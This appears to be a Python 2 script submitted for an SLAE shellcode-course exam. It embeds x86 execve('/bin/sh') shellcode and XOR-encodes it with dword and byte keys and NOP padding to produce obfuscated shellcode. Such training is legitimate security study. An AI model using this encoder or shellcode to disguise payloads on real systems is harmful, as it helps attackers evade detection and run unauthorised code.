#!/usr/bin/env python

# SLAE Exam Assignment #4: Shellcode Encoder 
# Author: Rikih Gunawan

# put shellcode here to encode
# http://shell-storm.org/shellcode/files/shellcode-811.php
# execve("/bin/sh")
shellcode = \
("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

res  = ""

# xor key
dkey  = 'deafface' # 4 bytes '\xde\xaf\xfa\xce'
bkey  = 0x7        # byte

def xor_strings(s1, s2):
    return ''.join(format(int(a, 16) ^ int(b, 16), 'x') for a,b in zip(s1,s2))

step = 4
n = 2
for i in range(0, len(shellcode), 4):
    # padding with \x90
    byte    = shellcode[i:step].encode('hex')  + '90'*((8-len(shellcode[i:step].encode('hex') ))/2)

    xor_str = xor_strings(byte, dkey)
    res    += "%s," % ','.join([ hex(int(xor_str[ii-n:ii],16) ^ bkey) for ii in range(len(xor_str), 0, -n)])
    step   += 4

print "[*] Original Shellcode: \n%s" % "".join([ "0x%s," % 
shellcode.encode('hex')[x:2+x] for x in range(0, len(shellcode.encode('hex')), 2) ])[:-1]
print "[*] Length : %s" % len(shellcode)
print "[+] XOR dword key: 0x%s" % dkey
print "[+] XOR byte key: 0x%s" % bkey
print "[*] Encoded Shellcode: \n%s" % res[:-1]
print "[*] Length : %s" % len(res.split(','))